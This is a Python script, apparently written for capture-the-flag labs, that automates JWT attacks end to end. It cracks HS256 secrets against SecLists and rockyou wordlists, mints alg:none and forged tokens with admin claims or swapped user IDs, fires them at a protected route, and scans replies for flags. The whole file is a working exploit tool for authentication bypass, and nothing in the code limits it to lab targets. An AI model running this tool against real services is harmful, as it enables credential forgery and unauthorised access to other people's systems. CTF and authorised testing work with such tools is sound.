#!/usr/bin/env python3
"""jwtquick — the whole cheap JWT attack surface in one foreground call.

Decodes the token, dictionary-cracks the HS256 secret, mints alg:none and
privilege-escalated variants, fires every candidate at a route that currently refuses
you, and scans status + headers + body for a flag.

    python3 jwtquick.py --token "$TOKEN" --base https://target --test /api/admin/stats

Only --token is required; without --base it just cracks and prints candidate tokens.
Cracking is a two-stage chain by default: the 104k-entry JWT-specific list first
(~1s — catches framework/tutorial defaults rockyou won't have), then rockyou
automatically on a miss (~30-40s — catches plain common words; the entry point for
common words IS common words, and CTF authors reach for them constantly). Worst case
is one rockyou scan either way, same as calling it alone; typical case is much faster.
Still belongs in the foreground — this stays a single blocking call either way, just
sometimes a ~40s one instead of ~1s.

--wordlist pins a single list and skips the chain entirely, for when you already know
which one you want:

    python3 jwtquick.py --token "$T" --base URL --test /admin --wordlist /path/to/rockyou.txt

Cookie-carried JWTs need their real transport plus an authenticated control:

    python3 jwtquick.py --token "$T" --base URL --control /api/me --test /admin \
      --cookie-name session
"""
import argparse, base64, hashlib, hmac, json, os, re, sys, time

# The wildcard prefix is deliberate -- a lab can use a flag prefix this harness
# has never seen. The payload charset is not: with `[^}\n]` any word followed by
# a brace matched, so `.form{margin:0}` and `body{background:#fff}` in an ordinary
# styled error page both read as flags. That is not merely noisy here, because a
# hit below is unconditional success and overrides the rejected/bypass verdict --
# one stylesheet in a refusing route's HTML would tag every forgery FLAG. This is
# flaghook.py's proven flag-body charset, which no CSS or JS block satisfies
# (`:` and `;` are absent) while every real flag payload does.
FLAG = re.compile(r"\w+\{[A-Za-z0-9_\-!?.@#$%^&*+=/]{4,120}\}")
def first_existing(paths):
    """Choose the first real file, retaining the preferred path for a loud miss."""
    paths = list(dict.fromkeys(os.path.expanduser(path) for path in paths if path))
    return next((path for path in paths if os.path.exists(path)), paths[0])


SECLISTS = os.path.expanduser(os.environ.get("SECLISTS") or first_existing([
    "/opt/security-tools/SecLists", "/usr/share/seclists", "~/Tools/SecLists",
]))
DEFAULT_WL = SECLISTS.rstrip("/") + "/Passwords/scraped-JWT-secrets.txt"
ROCKYOU = os.path.expanduser(os.environ.get("ROCKYOU") or first_existing([
    SECLISTS.rstrip("/") + "/Passwords/Leaked-Databases/rockyou.txt",
    "/usr/share/wordlists/rockyou.txt",
]))
# claims worth flipping, and what to flip them to
PRIV = {"role": "admin", "roles": ["admin"], "isAdmin": True, "is_admin": True,
        "admin": True, "user_type": "admin", "userType": "admin", "scope": "admin",
        "permissions": ["admin"], "type": "admin", "group": "admin"}
IDC = ("id", "userId", "user_id", "sub", "uid")

DENY_HINTS = ("unauthorized", "forbidden", "access denied", "invalid token", "invalid signature",
              "expired token", "not authorized", "permission denied", "authentication required",
              "must be logged in", "invalid or expired", "jwt malformed", "jwt expired",
              "no token provided", "token required", "missing authorization")

def looks_denial(status, text):
    """A 401/403 is always a denial; otherwise fall back to the body language —
    status codes get jittered on some labs, the wording usually doesn't."""
    if status in (401, 403):
        return True
    body = (text or "")[:300].lower()
    return any(h in body for h in DENY_HINTS)

def short_summary(r):
    """A parsed error/message/detail/code beats a raw body dump for scanning
    twenty candidates at a glance."""
    try:
        j = r.json()
        if isinstance(j, dict):
            for k in ("error", "message", "detail", "code"):
                if k in j and isinstance(j[k], (str, int, float, bool)):
                    return f"{k}={str(j[k])[:80]}"
    except Exception:
        pass
    return re.sub(r"\s+", " ", (r.text or "")).strip()[:80]

b64e = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=")
def b64d(s):
    s = s + "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode())

def sign(hdr, payload, secret):
    h = b64e(json.dumps(hdr, separators=(",", ":")).encode())
    p = b64e(json.dumps(payload, separators=(",", ":")).encode())
    s = b64e(hmac.new(secret.encode(), h + b"." + p, hashlib.sha256).digest())
    return (h + b"." + p + b"." + s).decode()

def unsigned(hdr, payload, alg, sig=""):
    h = b64e(json.dumps({**hdr, "alg": alg}, separators=(",", ":")).encode())
    p = b64e(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h.decode()}.{p.decode()}.{sig}"

def crack(hdr_b64, pay_b64, sig_b64, path):
    """Return the secret, or None. Compares raw digests — no re-encoding per candidate."""
    msg = (hdr_b64 + "." + pay_b64).encode()
    want = b64d(sig_b64)
    t0 = time.time()
    n = 0
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                cand = line.rstrip("\n\r")
                n += 1
                if hmac.compare_digest(hmac.new(cand.encode(), msg, hashlib.sha256).digest(), want):
                    print(f"[+] SECRET = {cand!r}   ({n:,} candidates, {time.time()-t0:.2f}s)")
                    return cand, True
    except OSError:
        print(f"[!] wordlist not found: {path}"); return None, False
    print(f"[-] no hit ({n:,} candidates, {time.time()-t0:.2f}s)")
    return None, True


def auth_request_kwargs(token, cookie_name):
    if cookie_name:
        return {"cookies": {cookie_name: token}}
    return {"headers": {"Authorization": "Bearer " + token}}


def claim_value(raw, original):
    """Keep numeric identity claims numeric while allowing UUID/string targets."""
    if isinstance(original, int) and re.fullmatch(r"-?\d+", raw):
        return int(raw)
    return raw


def escalated_payload(payload):
    changed = dict(payload)
    hit = False
    for key, value in PRIV.items():
        if key in changed:
            changed[key] = value
            hit = True
    if not hit:
        changed["role"] = "admin"
    return changed

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--token", required=True)
    ap.add_argument("--base", help="target base URL; omit to only mint tokens")
    ap.add_argument("--test", default="/", help="path that currently refuses you (403/401)")
    ap.add_argument("--control", help="authenticated path where the original token must succeed "
                    "and an invalid token must be denied; verifies token transport")
    ap.add_argument("--cookie-name", help="send JWTs in this cookie instead of Authorization: Bearer")
    ap.add_argument("--target-id", default="1", help="privileged identity used for id/sub swaps (default: 1)")
    ap.add_argument("--wordlist", help="crack against exactly this list only, "
                     "skipping the default two-stage chain (JWT-specific, then rockyou)")
    ap.add_argument("--no-crack", action="store_true")
    a = ap.parse_args()
    if a.cookie_name and re.search(r"[=;\r\n]", a.cookie_name):
        sys.exit("[!] --cookie-name must be one cookie name, without separators")

    parts = a.token.split(".")
    if len(parts) != 3:
        sys.exit("[!] not a 3-part JWT")
    hdr = json.loads(b64d(parts[0])); pay = json.loads(b64d(parts[1]))
    print(f"[*] header  {json.dumps(hdr)}")
    print(f"[*] payload {json.dumps(pay)}")

    if a.no_crack:
        secret = None
        crack_complete = True
    elif a.wordlist:
        secret, crack_complete = crack(parts[0], parts[1], parts[2], a.wordlist)
    else:
        # JWT-specific list first (~1s): catches framework/tutorial defaults rockyou
        # won't have. Auto-escalate to rockyou only on a miss — same worst case as
        # calling rockyou alone, much better typical case when the secret is a
        # common word ('pumpkin' was candidate 547 of 14M, 0.00s).
        secret, first_usable = crack(parts[0], parts[1], parts[2], DEFAULT_WL)
        crack_complete = bool(secret)
        if not secret:
            print("[*] no hit in JWT-specific list, escalating to rockyou...")
            secret, second_usable = crack(parts[0], parts[1], parts[2], ROCKYOU)
            crack_complete = bool(secret) or (first_usable and second_usable)
    if not a.no_crack and not crack_complete:
        print("[!] secret-crack coverage INCOMPLETE: no usable wordlist was found")

    cands = []
    esc = escalated_payload(pay)
    id_claim = next((key for key in IDC if key in pay), None)
    if not any(key in pay for key in PRIV) and id_claim:
        print(f"[i] no privilege claim: server-side role lookup may ignore injected role; "
              f"retaining {id_claim} identity-substitution candidates")
    # alg:none family — free, works regardless of the secret
    for alg in ("none", "None", "NONE", "nOnE"):
        cands.append((f"alg:{alg}:priv", unsigned(hdr, esc, alg)))
        if id_claim:
            swapped = {**esc, id_claim: claim_value(a.target_id, pay[id_claim])}
            cands.append((f"alg:{alg}:{id_claim}={a.target_id}", unsigned(hdr, swapped, alg)))
    if secret:
        cands.append(("forged:priv", sign(hdr, esc, secret)))
        if id_claim:
            target_value = claim_value(a.target_id, pay[id_claim])
            cands.append((f"forged:{id_claim}={a.target_id}",
                          sign(hdr, {**esc, id_claim: target_value}, secret)))
        cands.append(("forged:resign-only", sign(hdr, pay, secret)))

    if not a.base:
        for name, t in cands:
            print(f"\n--- {name}\n{t}")
        return 0 if crack_complete else 2

    try:
        import requests, urllib3
        urllib3.disable_warnings()
    except ImportError:
        sys.exit("[!] pip install requests")

    url = a.base.rstrip("/") + a.test
    transport = "cookie " + a.cookie_name if a.cookie_name else "Authorization: Bearer"
    if a.control:
        control_url = a.base.rstrip("/") + a.control
        try:
            good = requests.get(control_url, verify=False, timeout=20,
                                **auth_request_kwargs(a.token, a.cookie_name))
            bad = requests.get(control_url, verify=False, timeout=20,
                               **auth_request_kwargs("jwtquick.invalid.token", a.cookie_name))
        except Exception as e:
            print(f"\n[!] INCONCLUSIVE: transport control failed for {control_url}: {e}")
            return 2
        if looks_denial(good.status_code, good.text) or not looks_denial(bad.status_code, bad.text):
            print(f"\n[!] INCONCLUSIVE: {transport} was not proven on --control {a.control}; "
                  f"original={good.status_code}/{short_summary(good)} "
                  f"invalid={bad.status_code}/{short_summary(bad)}")
            return 2
        print(f"\n[*] transport verified via {a.control}: {transport} "
              f"(original {good.status_code}, invalid {bad.status_code})")
    else:
        print(f"\n[i] transport not independently verified ({transport}); add --control <known-auth-path> "
              "to distinguish an ignored token from a valid low-privilege denial")
    try:
        base_r = requests.get(url, verify=False, timeout=20,
                              **auth_request_kwargs(a.token, a.cookie_name))
    except Exception as e:
        print(f"\n[!] INCONCLUSIVE: baseline request failed for {url}: {e}")
        return 2
    base_denied = looks_denial(base_r.status_code, base_r.text)
    print(f"\n[*] baseline with your own token: {base_r.status_code} ({len(base_r.content)}b) "
          f"[{'denied' if base_denied else 'NOT denied'}] {short_summary(base_r)}")
    if not base_denied:
        print("[!] INCONCLUSIVE: --test must be a route that refuses the original token. "
              "This response may be a public route or SPA fallback; forged-token verdicts "
              "would not establish a bypass.")
        return 2
    print(f"[*] firing {len(cands)} candidates at {url}\n")
    interesting = False
    for name, t in cands:
        try:
            r = requests.get(url, verify=False, timeout=20,
                             **auth_request_kwargs(t, a.cookie_name))
        except Exception as e:
            print(f"  {name:22s} ERR {e}"); continue
        flags = set(FLAG.findall(r.text)) | {m for k, v in r.headers.items() for m in FLAG.findall(v)}
        cur_denied = looks_denial(r.status_code, r.text)
        if flags:
            # a flag is unconditional success regardless of status/body class
            tag = "FLAG"
            interesting = True
        elif cur_denied:
            # still reaches a denial — a reworded rejection is not progress
            tag = "rejected"
        elif base_denied:
            # the baseline denial is gone: this is the interesting case
            tag = "POSSIBLE BYPASS"
            interesting = True
        else:
            tag = "unchanged"
        print(f"  {name:22s} {r.status_code} ({len(r.content)}b) [{tag}] {short_summary(r)}")
        for k, v in r.headers.items():
            if "flag" in k.lower():
                print(f"      HDR {k}: {v}")
        if flags:
            print(f"      FLAG {flags}")
            print(f"      TOKEN {t}")
        elif tag == "POSSIBLE BYPASS":
            print(f"      TOKEN {t}")
    if not crack_complete and not interesting:
        print("[!] INCONCLUSIVE: unsigned variants were tested, but secret cracking had no usable wordlist")
        return 2
    return 0

if __name__ == "__main__":
    sys.exit(main())
